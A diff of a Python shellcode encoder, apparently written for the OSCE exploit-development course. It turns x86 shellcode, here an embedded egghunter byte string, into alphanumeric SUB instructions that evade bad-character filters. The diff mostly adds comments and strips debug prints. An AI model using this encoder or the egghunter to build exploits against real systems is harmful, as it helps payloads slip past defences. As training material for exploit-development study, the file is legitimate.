@@ -1,15 +1,19 @@
 #!/usr/bin/env python
-from shellnoob import ShellNoob
-import binascii
+# alpha numeric encoder for shellcode using 1 register zerooing it and subtracting only good chars to assemble shellcode on the stack.
+# This encoder was made for the OSCE course by 0x90 and B0x41S
+# use for testing purposes only
+
+from shellnoob import ShellNoob # used to disassemble asm to hex
 
 sn = ShellNoob(flag_intel=True)
-# example to just for testing purposes
+
+#This is the shellcode we are going to encode and the register we have available to do this
 shellcode = (
     r"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
 register = "EAX"
 
 
-def check_len(shell):
+def check_len(shell):# a check if the length of the shellcode is divisable in blocks of 4 bytes
     if len(shell) / 4 % 4 != 0:
         NofP = 4 - (len(shell) / 4 % 4 != 0)
         print("Shellcode not divisible by 4 padding with " + str(NofP) + " Nops")
@@ -18,11 +22,10 @@ def check_len(shell):
     return shell
 
 
-def remove(shellcode):
+def remove(shellcode):# remove "' and \x from shellcode to get a hexadecimal string without formatting
     shellcode = shellcode.replace("\\x", "")
     shellcode = shellcode.replace("'", "")
     shellcode = shellcode.replace('"', "")
-    # print("Hex string   = " + shellcode)
     return shellcode
 
 
@@ -32,7 +35,6 @@ def reverse(hexstring):
     hexbyte3 = hexstring[4] + hexstring[5]
     hexbyte4 = hexstring[6] + hexstring[7]
     newhex = hexbyte4 + hexbyte3 + hexbyte2 + hexbyte1
-    # print("Hex reversed = " + newhex)
     return newhex
 
 
@@ -47,7 +49,6 @@ def split(hexstring):
 
 def calc(hexvalue1, hexvalue2):
     revhex = hexvalue1
-    # print("calculating " + hexvalue1 + " " + hexvalue2)
     if hexvalue2 == "wrap":
         intofhex = int(revhex, 16)  # Make int to be able to calculate
         zeroMin = 0 - intofhex & 0xFFFFFFFF  # Make the clock go round
@@ -62,66 +63,45 @@ def calc(hexvalue1, hexvalue2):
 
 
 def sub(values):
-    zeroone = 0
     retvalue = []
     for i in values:
-        # print("the hexchar is: " + i)
         hex7c = int('0x7c', 16)
         hexchar = int(i, 16)
         if hexchar == 0:
-            # print("Dealing with 00")
             hexchar += 100
             retvalue += '0x7c', '0x7c', '0x08'
         elif hexchar == 1:
-            # print("Dealing with 01")
             hexchar += 101
             retvalue += '0x7c', '0x84', '0x01'
         elif hexchar <= hex7c:
             nextsub = '0x01'
             hexchar = hexchar - 0x02  # deze nog aanpassen ivm 0
-            # hexchar = hex(hexchar)
             hexchar = "0x" + hex(hexchar)[2:].zfill(2)
-            # print("<=7c so -2: " + hexchar)
             retvalue += hexchar, nextsub, nextsub
-            # print(retvalue)
         elif hexchar >= hex7c * 2:
             remainder = hexchar - (hex7c + hex7c)
-            # remainder = int('0x06', 16)
-            # print remainder
             remainder = "0x" + hex(remainder)[2:].zfill(2)
-            # print("groter dan 0xF8 aaa " + hex(hexchar) + " remainder is " + remainder)
             hex7c = hex(hex7c)
             retvalue += hex7c, hex7c, remainder
-            # print(retvalue)
+
         else:
             remainder = hexchar - hex7c - 0x01
             remainder = "0x" + hex(remainder)[2:].zfill(2)
-            # print("tussen 7C en F8 " + hex(hexchar) + " remainder is " + remainder)
             hex7c = hex(hex7c)
             retvalue += hex7c, remainder, '0x01'
-            # print(retvalue)
-        # chunk1 = sub3(a)
 
     # This whole piece must be smarter !!
     # In case of a 00 we must change some values
     if values[0] == "00":
         pass  # print("first value")
     if values[1] == "00":
-        # print("second value is 00")
-        # print(retvalue)
-        # retvalue[0] = "0x15"
         retvalue[0] = calc(retvalue[0], '0x01')
     if values[2] == "00":
-        # print("third value is 00")
         retvalue[3] = calc(retvalue[3], '0x01')
     if values[3] == "00":
         pass  # print("fourth value")
-    # Problaby in the case of 0x01 we also need to ajust
     if values[3] == "01":
-        # print(retvalue[6])
-        # print("fourth value is 01")
-        retvalue[6] = calc(retvalue[6], '0x01')
-
+         retvalue[6] = calc(retvalue[6], '0x01')
     return retvalue
 
 
@@ -129,7 +109,6 @@ def test(chunks):
     intofhex1 = int(chunks[0], 16)
     intofhex2 = int(chunks[1], 16)
     intofhex3 = int(chunks[2], 16)
-
     test = hex(0 - intofhex1 - intofhex2 - intofhex3 & 0xFFFFFFFF)
     result = "0x" + test[2:].zfill(8)
     return result
@@ -145,18 +124,12 @@ def strip(ugly):
 
 def subtable(retvalue):
     nice = []
-    # chunk1 = retvalue[9:12][0] + retvalue[6:9][0] + retvalue[3:6][0] + retvalue[0:3][0]
     chunk1 = retvalue[0:3][0] + retvalue[3:6][0] + retvalue[6:9][0] + retvalue[9:12][0]
-    # chunk2 = retvalue[9:12][1] + retvalue[6:9][1] + retvalue[3:6][1] + retvalue[0:3][1]
     chunk2 = retvalue[0:3][1] + retvalue[3:6][1] + retvalue[6:9][1] + retvalue[9:12][1]
-    # chunk3 = retvalue[9:12][2] + retvalue[6:9][2] + retvalue[3:6][2] + retvalue[0:3][2]
     chunk3 = retvalue[0:3][2] + retvalue[3:6][2] + retvalue[6:9][2] + retvalue[9:12][2]
-    # print(chunk1, chunk2, chunk3)
-    # print("Creating  subtables ...")
     nice.append(strip(chunk1))
     nice.append(strip(chunk2))
     nice.append(strip(chunk3))
-    # print(nice)
     return nice
 
 
